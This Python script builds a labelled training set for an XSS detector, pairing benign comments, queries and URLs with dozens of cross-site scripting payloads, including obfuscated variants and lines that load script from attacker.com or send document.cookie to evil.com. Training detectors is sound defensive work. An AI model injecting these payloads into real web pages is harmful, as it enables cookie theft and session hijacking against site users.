import json

benign_samples = [
    # Normal conversation & comments
    "Hello, this is a legitimate comment.",
    "Very helpful cybersecurity tutorial, thanks for sharing!",
    "I enjoyed reading this article on secure software development.",
    "Great explanation of web application architectures and protocols.",
    "Looking forward to the next update on database indexing.",
    "Could you provide more details about session management?",
    "The demonstration code was easy to understand and test locally.",
    "Defensive programming is essential for modern web services.",
    "Thanks for the thorough documentation and clean layout.",
    "This tutorial helped clarify client-server communication.",

    # Search queries
    "Python flask web architecture",
    "SQLite foreign key constraints",
    "Computer networking TCP/IP model",
    "Defensive input validation patterns",
    "HTTP response status codes and headers",
    "How to configure Content-Security-Policy",
    "Cross-site scripting mitigation best practices",
    "Unit testing with pytest and coverage tools",
    "Application factory pattern in Python Flask",
    "Structured logging with timestamps and request IDs",

    # Profile biographies & handles
    "Security researcher and software developer.",
    "Computer science undergraduate interested in application security.",
    "Full-stack engineer focusing on clean architecture.",
    "Python enthusiast and open-source contributor.",
    "Studying network protocols, cryptography, and defensive design.",
    "Security analyst researching web vulnerability patterns.",
    "Developer with experience in relational databases and REST APIs.",
    "Learning web standards, semantic HTML, and modern CSS.",

    # Harmless punctuation & math inequalities
    "Price comparison: $100 < $200 and quality > average!",
    "Math formula: x < 10 and y > 20 for positive integers.",
    "Check out John's report: 'Security Analysis 2026'.",
    "Expressions: 5 < 15 & 30 > 25.",
    "Variables: a < b and b < c implies a < c.",
    "Result: threshold > 0.75 and error_rate < 0.05.",
    "Comparing versions: v1.2 < v2.0 & build > 400.",

    # Educational & technical prose discussing code/HTML/JS concepts
    "In JavaScript, functions like alert() and eval() require defensive review.",
    "HTML tags such as <script> are discussed in this security document.",
    "Remember that document.cookie is a browser API used for session storage.",
    "SVG stands for Scalable Vector Graphics and uses XML markup.",
    "Inline event handlers like onclick and onload can bind behavior to elements.",
    "JavaScript uses prompt() and confirm() for simple modal dialogs.",
    "Web browsers support URI schemes such as https, http, and mailto.",
    "In web security, window.location handles browser redirects.",
    "HTML elements like <iframe> can embed sub-documents within a webpage.",
    "The <body> tag contains the rendered content of an HTML document.",
    "Educational note: javascript: pseudo-protocols can be dangerous if unvalidated.",
    "Discussing DOM sinks: document.write is considered legacy practice.",
    "Code review tip: verify attribute delimiter handling for quotes.",
    "How to safely parse JSON without using eval() in Python or JavaScript.",
    "Understanding the difference between <script> tags and external bundles.",

    # Valid URLs
    "https://example.com/docs/index.html",
    "http://security-research.org/articles?id=42&sort=asc",
    "https://github.com/project/repository",
    "https://developer.mozilla.org/en-US/docs/Web/JavaScript",
    "http://localhost:5000/search?query=flask",
    "https://en.wikipedia.org/wiki/Cross-site_scripting",
    "https://docs.python.org/3/library/sqlite3.html"
]

suspicious_samples = [
    # Script tag variants
    "<script>alert(1)</script>",
    "<script src='http://attacker.com/xss.js'></script>",
    "<sCrIpt>alert('xss')</sCrIpT>",
    "<script /x >alert(1)</script>",
    "<script>eval(document.cookie)</script>",
    "<script>prompt(1)</script>",
    "<script>confirm('hacked')</script>",
    "<script>window.location='http://evil.com?c='+document.cookie</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "</script><script>alert(1)</script>",

    # Inline event handlers
    "<img src=x onerror=alert(1)>",
    "<img src=invalid onerror='alert(document.domain)'>",
    "<body onload=alert(1)>",
    "<body onload='calc()'>",
    "<input onfocus=alert(1) autofocus>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('svg')>",
    "<button onclick=alert(1)>Click</button>",
    "<a href='#' onmouseover=alert(1)>Link</a>",
    "<select onchange=alert(1)><option>1</option></select>",
    "<video src=x onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)></audio>",
    "<details open ontoggle=alert(1)>",

    # Executable URI schemes
    "javascript:alert(1)",
    "JAVASCRIPT:alert(document.cookie)",
    "javascript:prompt(1)",
    "javascript:confirm(1)",
    "vbscript:msgbox(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",

    # Dangerous elements & SVG constructs
    "<svg><animate onbegin=alert(1)>",
    "<svg><set attributeName=onload onbegin=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<iframe src='http://evil.com/xss'></iframe>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>",
    "<embed src='payload.swf'>",

    # Attribute breakouts & compound vectors
    "\"><script>alert(1)</script>",
    "';alert(1)//",
    "\"><img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "\" onclick=\"alert(document.cookie)\"",
    "\" onmouseover=\"alert(1)\" style=\"display:block;width:1000px;height:1000px;",
    "' onfocus=alert(1) autofocus '",
    "\"><input onfocus=alert(1) autofocus>",

    # Encoded & obfuscated variants
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&lt;img src=x onerror=alert(1)&gt;",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
    "<img src=\"x\" onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041\">",
    "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>"
]

all_data = []
for text in benign_samples:
    all_data.append({"text": text, "label": 0})
for text in suspicious_samples:
    all_data.append({"text": text, "label": 1})

with open("ml/data/xss_training.jsonl", "w", encoding="utf-8") as f:
    for item in all_data:
        f.write(json.dumps(item) + "\n")

print(f"Generated {len(all_data)} dataset samples ({len(benign_samples)} benign, {len(suspicious_samples)} suspicious).")
